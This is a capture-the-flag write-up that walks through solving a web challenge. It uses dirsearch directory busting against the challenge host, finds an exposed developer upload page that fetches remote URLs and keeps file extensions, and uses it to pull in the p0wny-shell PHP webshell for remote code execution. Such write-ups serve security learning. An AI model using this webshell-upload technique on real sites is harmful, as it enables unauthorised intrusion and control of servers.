# Introduction

This challenge allows you to use some aggressive scanning tools, keep that in mind.

# Where do I even go?

Generally, we start with view source code. Nothing of interest, except for a few futile pleas for mercy at the bottom.

All the links lead to nowhere interesting. So we're left with trying to find another webpage.

## Directory Busting

Everyone has their favourite tool for this, but my personal favourite is dirsearch. It's fast, clean and efficient.

https://github.com/maurosoria/dirsearch

```bash
python3 dirsearch.py -u http://172.104.49.68:1000 -e php -t 100
```
-u for url
-e to specify that we're looking for php files
-t to specify how many threads we're using (speed and aggression)

![alt text](https://imgur.com/oL9e1ui.png)

This looks extremely intimidating, but fear not, for the ones that look correct, are correct.

We're looking for status 200 (OK) or 301 (Redirected), and apart from some index.php variants, we can see a developer folder. Good. Let's visit it.

![alt text](https://imgur.com/0aE1abh.png)

As you can see, Leonard decided to be merciful, and expose everything in this folder for you. Let's check out meow.php, and remember that uploads url.

## The php vulnerability

![alt text](https://imgur.com/FBSykOm.png)

Wow. That's straightforward. Just to make sure Leonard didn't be a little shit and add weird gimmicks, let's try it out:

![alt text](https://imgur.com/vgbipTr.png)

Sure enough, it was downloaded at http://172.104.49.68:1000/developer/uploads/bugcat_capoo_11.png

But the interesting thing is that the extension is preserved. That's an important detail, and it can also make things VERY easy for us.

## Introducing Webshells

https://github.com/flozz/p0wny-shell

This is one variant of a webshell, one that I frequently use, but there are definitely many other variants you can try.

So our goal now, is to install this .php file, so we can use it against the website.

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

We shall submit this url and cross our fingers.

![alt text](https://imgur.com/kLXS49f.png)

![alt text](https://imgur.com/LHmPot2.png)

Remote Code Execution achieved.

Solved.

![alt text](https://imgur.com/XMrMxmv.png)

